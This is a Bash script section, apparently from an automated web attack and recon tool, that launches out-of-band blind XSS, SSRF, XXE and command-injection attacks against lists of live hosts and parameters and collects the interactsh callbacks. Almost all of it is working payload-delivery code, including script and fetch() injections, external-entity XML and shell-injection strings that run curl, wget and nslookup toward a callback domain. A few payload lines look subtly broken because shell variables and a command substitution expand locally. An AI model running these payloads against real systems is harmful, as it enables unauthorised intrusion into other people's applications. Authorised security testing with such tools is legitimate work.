#======================= PHASE 13: OOB OUT-OF-BAND DETECTION =======================
# Uses interactsh for blind XSS, SSRF, XXE, CMDi callbacks
# All other phases that need OOB use $OOB_DOMAIN (set here at runtime)

_oob_start_server() {
    local OOB_DIR="$OUTDIR/oob"
    mkdir -p "$OOB_DIR"

    if ! command -v interactsh-client &>/dev/null; then
        warning "interactsh-client not found — OOB via DNS canary only"
        if [ -n "$BURP_COLLABORATOR" ]; then
            OOB_DOMAIN="$BURP_COLLABORATOR"
            info "Using Burp Collaborator domain: $OOB_DOMAIN"
        fi
        return
    fi

    log "Starting interactsh-client on $INTERACTSH_SERVER ..."
    interactsh-client \
        -server "$INTERACTSH_SERVER" \
        -json \
        -o "$OOB_DIR/interactions.jsonl" \
        2>"$OOB_DIR/interactsh_stderr.log" \
        > "$OOB_DIR/interactsh_stdout.log" &
    echo $! > "$OOB_DIR/oob_pid.txt"

    local WAIT=0
    while [ $WAIT -lt 30 ]; do
        OOB_DOMAIN=$(grep -oE "[a-z0-9]{20,}\.$INTERACTSH_SERVER" \
            "$OOB_DIR/interactsh_stdout.log" 2>/dev/null | head -1)
        [ -n "$OOB_DOMAIN" ] && break
        # Also check stderr (some versions output there)
        OOB_DOMAIN=$(grep -oE "[a-z0-9]{20,}\.$INTERACTSH_SERVER" \
            "$OOB_DIR/interactsh_stderr.log" 2>/dev/null | head -1)
        [ -n "$OOB_DOMAIN" ] && break
        sleep 1
        WAIT=$(( WAIT + 1 ))
    done

    if [ -n "$OOB_DOMAIN" ]; then
        echo "$OOB_DOMAIN" > "$OOB_DIR/oob_domain.txt"
        success "OOB listener active: $OOB_DOMAIN"
    else
        warning "Could not get OOB domain from interactsh — killing listener"
        kill "$(cat "$OOB_DIR/oob_pid.txt" 2>/dev/null)" 2>/dev/null || true
        rm -f "$OOB_DIR/oob_pid.txt"
    fi
}

_oob_stop_server() {
    local PID_FILE="$OUTDIR/oob/oob_pid.txt"
    [ -f "$PID_FILE" ] || return
    kill "$(cat "$PID_FILE")" 2>/dev/null || true
    rm -f "$PID_FILE"
}

_oob_wait_and_collect() {
    local WAIT_SEC="${1:-$OOB_WAIT_SECONDS}"
    local OOB_DIR="$OUTDIR/oob"
    local RESULTS_FILE="$OOB_DIR/callback_summary.txt"

    log "[OOB] Waiting ${WAIT_SEC}s for callbacks from $OOB_DOMAIN ..."
    sleep "$WAIT_SEC"

    : > "$RESULTS_FILE"
    if [ -s "$OOB_DIR/interactions.jsonl" ]; then
        local COUNT
        COUNT=$(wc -l < "$OOB_DIR/interactions.jsonl")
        vuln "OOB CALLBACKS RECEIVED: $COUNT interactions on $DOMAIN"
        notify_vuln "critical" "OOB: $COUNT blind vulnerability callbacks on $DOMAIN"

        jq -r '
            "[\(.protocol | ascii_upcase)] \(.remote-address // "?") ← \(.unique-id // "?")\n" +
            "  Req: \(.raw-request // "(no body)" | split("\n")[0])\n"
        ' "$OOB_DIR/interactions.jsonl" 2>/dev/null > "$RESULTS_FILE" || true

        # Categorize by protocol
        for PROTO in http dns smtp ftp; do
            local CNT
            CNT=$(jq -r "select(.protocol==\"$PROTO\") | .unique-id" \
                "$OOB_DIR/interactions.jsonl" 2>/dev/null | wc -l)
            [ "$CNT" -gt 0 ] && success "  $PROTO callbacks: $CNT"
        done
    else
        info "No OOB callbacks received (payloads still delivered — may trigger later)"
    fi
}

phase_13_oob_testing() {
    if phase_done "phase_13"; then return 0; fi
    [ "$OOB_MODE" -ne 1 ] && { info "OOB mode disabled — skipping phase 13"; return; }
    phase_banner "PHASE 13: OOB DETECTION (BLIND XSS / SSRF / XXE / CMDi)"

    local START_TIME
    START_TIME=$(date +%s)
    local OOB_DIR="$OUTDIR/oob"
    local ALIVE_FILE="$OUTDIR/alive/final_alive.txt"
    local PARAM_FILE="$OUTDIR/urls/parameters.txt"

    mkdir -p "$OOB_DIR"
    _oob_start_server

    if [ -z "$OOB_DOMAIN" ]; then
        warning "No OOB domain available — skipping OOB phase"
        return
    fi

    : > "$OOB_DIR/blind_xss_targets.txt"
    : > "$OOB_DIR/blind_ssrf_targets.txt"
    : > "$OOB_DIR/blind_xxe_targets.txt"
    : > "$OOB_DIR/blind_cmdi_targets.txt"

    local TAG
    TAG=$(date +%s | tail -c 6)   # short unique tag for this run

    # ──────────────────────────────────────────────────────
    # [13.1] BLIND XSS VIA OOB
    # ──────────────────────────────────────────────────────
    log "[13.1] Injecting blind XSS payloads (OOB callback: $OOB_DOMAIN)..."

    # Multiple payload types covering different reflection contexts
    local -a BXSS_PAYLOADS=(
        "<script src=//bxss.${OOB_DOMAIN}/${TAG}></script>"
        "\">'><img src=x onerror=fetch('//bxss.${OOB_DOMAIN}/${TAG}')>"
        "'-fetch('//bxss.${OOB_DOMAIN}/${TAG}')-'"
        "<svg onload=fetch('//bxss.${OOB_DOMAIN}/${TAG}')>"
        "javascript:fetch('//bxss.${OOB_DOMAIN}/${TAG}')"
        "\"><iframe src=//bxss.${OOB_DOMAIN}/${TAG}></iframe>"
    )

    if [ -s "$PARAM_FILE" ]; then
        local TOTAL_PARAMS
        TOTAL_PARAMS=$(wc -l < "$PARAM_FILE")
        local P_IDX=0
        while IFS= read -r PURL && [ $P_IDX -lt 200 ]; do
            P_IDX=$(( P_IDX + 1 ))
            progress_bar "BXSSinject" "$P_IDX" "200"
            local PAYLOAD="${BXSS_PAYLOADS[$(( P_IDX % ${#BXSS_PAYLOADS[@]} ))]}"
            local ENC_PAYLOAD
            ENC_PAYLOAD=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" \
                "$PAYLOAD" 2>/dev/null) \
                || ENC_PAYLOAD=$(printf '%s' "$PAYLOAD" | jq -Rr @uri 2>/dev/null) \
                || ENC_PAYLOAD=$(printf '%s' "$PAYLOAD" | sed \
                    's/ /%20/g;s/</%3C/g;s/>/%3E/g;s/"/%22/g;s/'"'"'/%27/g;s/;/%3B/g;s/(/%28/g;s/)/%29/g;s/`/%60/g;s/\\/%5C/g')
            local INURL
            INURL=$(echo "$PURL" | sed -E "s/=[^&?#]*/=$ENC_PAYLOAD/g" | head -c 3000)
            curl_safe -o /dev/null "$INURL" 2>/dev/null &
            echo "$INURL" >> "$OOB_DIR/blind_xss_targets.txt"
        done < "$PARAM_FILE"
        echo ""
    fi

    # POST-based blind XSS
    head -30 "$ALIVE_FILE" 2>/dev/null | while IFS= read -r URL; do
        local PAYLOAD="${BXSS_PAYLOADS[0]}"
        for FIELD in name email message comment feedback subject body input value search q username; do
            curl_safe -s -X POST "$URL" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                --data-urlencode "${FIELD}=${PAYLOAD}" \
                -o /dev/null 2>/dev/null &
        done
        # JSON body XSS
        curl_safe -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"$PAYLOAD\",\"email\":\"test@${OOB_DOMAIN}\",\"message\":\"$PAYLOAD\"}" \
            -o /dev/null 2>/dev/null &
    done
    success "[13.1] Blind XSS payloads delivered: $(wc -l < "$OOB_DIR/blind_xss_targets.txt" 2>/dev/null || echo 0) URLs"

    # ──────────────────────────────────────────────────────
    # [13.2] BLIND SSRF VIA OOB
    # ──────────────────────────────────────────────────────
    log "[13.2] Blind SSRF testing (OOB: ssrf.${OOB_DOMAIN})..."

    local SSRF_URL="http://ssrf.${OOB_DOMAIN}/${TAG}"
    local SSRF_URL_HTTPS="https://ssrf.${OOB_DOMAIN}/${TAG}"

    # SSRF-prone parameter patterns
    local SSRF_PARAM_RE='[?&](url|uri|src|dest|destination|redirect|return|returnto|next|target|path|host|proxy|endpoint|feed|image|img|link|load|callback|webhook|service|api_url|resource|ref|referrer|fetch|open|file|document|page|template|data|input|source|from|location|goto|go|continue|navigate|forward|redir|request|action|site|domain|server|origin|base|back)='

    if [ -s "$PARAM_FILE" ]; then
        grep -iE "$SSRF_PARAM_RE" "$PARAM_FILE" 2>/dev/null | head -100 | while IFS= read -r PURL; do
            local INJECTED
            INJECTED=$(echo "$PURL" | sed -E "s|($SSRF_PARAM_RE)[^&]*|\1$SSRF_URL|gi")
            curl_safe -o /dev/null "$INJECTED" 2>/dev/null &
            echo "$INJECTED" >> "$OOB_DIR/blind_ssrf_targets.txt"
        done
    fi

    # SSRF via headers on all alive hosts
    head -30 "$ALIVE_FILE" 2>/dev/null | while IFS= read -r URL; do
        local -a SSRF_HDRS=(
            "X-Forwarded-For: $SSRF_URL"
            "X-Real-IP: $SSRF_URL"
            "Referer: $SSRF_URL"
            "X-Originating-IP: $SSRF_URL"
            "True-Client-IP: $SSRF_URL"
            "Client-IP: $SSRF_URL"
            "X-Custom-IP-Authorization: $SSRF_URL"
            "X-Host: ssrf.${OOB_DOMAIN}"
            "X-Forwarded-Host: ssrf.${OOB_DOMAIN}"
        )
        for HDR in "${SSRF_HDRS[@]}"; do
            curl_safe -H "$HDR" -o /dev/null "$URL" 2>/dev/null &
        done
        echo "$URL" >> "$OOB_DIR/blind_ssrf_targets.txt"
    done
    success "[13.2] Blind SSRF payloads delivered"

    # ──────────────────────────────────────────────────────
    # [13.3] BLIND XXE VIA OOB
    # ──────────────────────────────────────────────────────
    log "[13.3] Blind XXE injection (OOB: xxe.${OOB_DOMAIN})..."

    local XXE_OOB_URL="http://xxe.${OOB_DOMAIN}/${TAG}"
    local -a XXE_PAYLOADS=(
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"$XXE_OOB_URL\">]><root>&xxe;</root>"
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"$XXE_OOB_URL/oob.dtd\">%xxe;]><root/>"
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo SYSTEM \"$XXE_OOB_URL/evil.dtd\"><root/>"
        "<![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"$XXE_OOB_URL\">]><root>&xxe;</root>]]>"
    )

    head -30 "$ALIVE_FILE" 2>/dev/null | while IFS= read -r URL; do
        echo "$URL" >> "$OOB_DIR/blind_xxe_targets.txt"
        for CType in "application/xml" "text/xml" "application/soap+xml" "application/rss+xml"; do
            for PAYLOAD in "${XXE_PAYLOADS[@]}"; do
                curl_safe -s -X POST "$URL" \
                    -H "Content-Type: $CType" \
                    -d "$PAYLOAD" \
                    -o /dev/null 2>/dev/null &
            done
        done
        # SVG-based XXE (file upload endpoints)
        local SVG_XXE="<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE svg [<!ELEMENT svg ANY><!ENTITY xxe SYSTEM \"$XXE_OOB_URL/svg\">]><svg>&xxe;</svg>"
        curl_safe -s -X POST "${URL%/}/upload" \
            -F "file=@-;filename=evil.svg;type=image/svg+xml" \
            --data-binary "$SVG_XXE" \
            -o /dev/null 2>/dev/null &
    done
    success "[13.3] XXE payloads delivered"

    # ──────────────────────────────────────────────────────
    # [13.4] BLIND COMMAND INJECTION VIA DNS OOB
    # ──────────────────────────────────────────────────────
    log "[13.4] Blind command injection via DNS/HTTP OOB..."

    local CMDI_DNS="cmdi.${OOB_DOMAIN}"
    local CMDI_HTTP="http://cmdi.${OOB_DOMAIN}/${TAG}"

    # Payloads — DNS-based (most reliable, no HTTP needed)
    local -a CMDI_PAYLOADS=(
        "; nslookup $CMDI_DNS ;"
        "| nslookup $CMDI_DNS"
        "\`nslookup $CMDI_DNS\`"
        "\$(nslookup $CMDI_DNS)"
        "; curl $CMDI_HTTP ;"
        "| curl $CMDI_HTTP"
        "\`curl $CMDI_HTTP\`"
        "\$(curl $CMDI_HTTP)"
        "; wget -q -O- $CMDI_HTTP ;"
        "; ping -c1 $CMDI_DNS ;"
        "& ping -c1 $CMDI_DNS &"
        "%0anslookup$IFS$CMDI_DNS"
        "%0acurl$IFS$CMDI_HTTP"
        "${IFS}curl${IFS}$CMDI_HTTP"
        "$(echo Y3VybCBjbWRpLiRPT0JfRE9NQUlO | base64 -d)"
    )

    if [ -s "$PARAM_FILE" ]; then
        local CMI=0
        while IFS= read -r PURL && [ $CMI -lt 100 ]; do
            CMI=$(( CMI + 1 ))
            for CPAY in "${CMDI_PAYLOADS[@]:0:4}"; do
                local ENC
                ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" \
                    "$CPAY" 2>/dev/null) \
                || ENC=$(printf '%s' "$CPAY" | jq -Rr @uri 2>/dev/null) \
                || ENC=$(printf '%s' "$CPAY" | sed 's/;/%3B/g;s/ /%20/g;s/(/%28/g;s/)/%29/g;s/`/%60/g;s/\$/%24/g')
                local IURL
                IURL=$(echo "$PURL" | sed -E "s/=[^&?#]*/=$ENC/g" | head -c 3000)
                curl_safe -o /dev/null "$IURL" 2>/dev/null &
            done
            echo "$PURL" >> "$OOB_DIR/blind_cmdi_targets.txt"
        done < "$PARAM_FILE"
    fi
    success "[13.4] CMDi payloads delivered"

    # ──────────────────────────────────────────────────────
    # [13.5] WAIT FOR CALLBACKS + REPORT
    # ──────────────────────────────────────────────────────
    # Wait for all background payload delivery jobs before starting callback window
    wait 2>/dev/null || true
    _oob_wait_and_collect "$OOB_WAIT_SECONDS"
    _oob_stop_server

    local CB_COUNT
    CB_COUNT=$(wc -l < "$OOB_DIR/interactions.jsonl" 2>/dev/null || echo 0)
    success "PHASE 13 DONE — OOB callbacks: $CB_COUNT | Time: $(( $(date +%s) - $START_TIME ))s"
    notify "Phase 13: OOB done — $CB_COUNT callbacks received on $OOB_DOMAIN" "📡"
    echo ""
}
